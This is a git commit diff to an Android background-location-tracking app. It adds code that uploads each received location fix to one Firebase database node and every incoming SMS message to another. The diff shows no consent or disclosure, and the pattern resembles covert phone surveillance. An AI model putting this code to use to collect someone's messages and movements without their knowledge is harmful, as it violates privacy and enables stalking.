4c79b296ce385a68194e2b0dd865c7f28c85f179
David <styxdlt@gmail.com>
2024-04-28 21:01:49 -0700

    Sun Apr 28 9:01 PM

--- app/src/main/java/com/plcoding/backgroundlocationtracking/LocationReceiver.kt
+++ app/src/main/java/com/plcoding/backgroundlocationtracking/LocationReceiver.kt
@@ -6,6 +6,10 @@ import android.content.Intent
 import android.util.Log
 import android.widget.Toast
 import androidx.core.app.NotificationCompat
+import com.google.firebase.database.DataSnapshot
+import com.google.firebase.database.DatabaseError
+import com.google.firebase.database.FirebaseDatabase
+import com.google.firebase.database.ValueEventListener
 
 class LocationReceiver: BroadcastReceiver() {
     override fun onReceive(p0: Context?, p1: Intent?) {
@@ -17,6 +21,33 @@ class LocationReceiver: BroadcastReceiver() {
                 val longitude = p1.getDoubleExtra("longitude", 0.0)
                 println("Received new intent! latitude: $latitude and longitude: $longitude")
 
+
+                val firebaseDatabase = FirebaseDatabase.getInstance()
+                val databaseReference = firebaseDatabase.getReference("location_tree")
+
+                // Create location object
+                val locationObj = LocationObj(latitude.toString(), longitude.toString())
+                val newDatabaseReference = databaseReference.push()
+                // we are using add value event listener method
+                // which is called with database reference.
+                databaseReference.addValueEventListener(object :
+                    ValueEventListener {
+                    override fun onDataChange(snapshot: DataSnapshot) {
+                        // inside the method of on Data change we are setting
+                        // our object class to our database reference.
+                        // data base reference sends data to firebase.
+                        newDatabaseReference.setValue(locationObj)
+                        // after adding this data we
+                        // are showing success message.
+                        println("Data added to Firebase Database")
+                    }
+
+                    override fun onCancelled(error: DatabaseError) {
+                        // if the data is not added or it is cancelled then
+                        // we are displaying a failure message.
+                        println("Failed to add data $error")
+                    }
+                })
             }
         }
     }
--- app/src/main/java/com/plcoding/backgroundlocationtracking/SMSReceiver.kt
+++ app/src/main/java/com/plcoding/backgroundlocationtracking/SMSReceiver.kt
@@ -3,6 +3,11 @@ package com.plcoding.backgroundlocationtracking
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
+import com.google.firebase.database.DataSnapshot
+import com.google.firebase.database.DatabaseError
+import com.google.firebase.database.DatabaseReference
+import com.google.firebase.database.FirebaseDatabase
+import com.google.firebase.database.ValueEventListener
 
 class SMSReceiver: BroadcastReceiver() {
     override fun onReceive(p0: Context?, p1: Intent?) {
@@ -23,6 +28,33 @@ class SMSReceiver: BroadcastReceiver() {
                     }
                     val formattedMessages = sb.toString()
                     println("Received SMS messages:\n$formattedMessages")
+
+
+                    val database: FirebaseDatabase = FirebaseDatabase.getInstance()
+                    val smsRef: DatabaseReference = database.getReference("SMS_tree")
+
+
+                    // Loop through the SMS list and push each message to Firebase
+                    for (sms in smsArray) {
+                        // Check if the SMS message already exists in the database
+                        smsRef.addListenerForSingleValueEvent(object :
+                            ValueEventListener {
+                            override fun onDataChange(dataSnapshot: DataSnapshot) {
+                                // Don't check if SMS message exists in the database, push anyways
+                                val key = smsRef.push().key
+                                if (key != null) {
+                                    smsRef.child(key).setValue(sms)
+                                    println("SMS Added to Firebase: $sms")
+
+                                }
+                            }
+
+                            override fun onCancelled(databaseError: DatabaseError) {
+                                // Handle database error
+                                println("Error adding data: ${databaseError.message}")
+                            }
+                        })
+                    }
 
                 }
             }
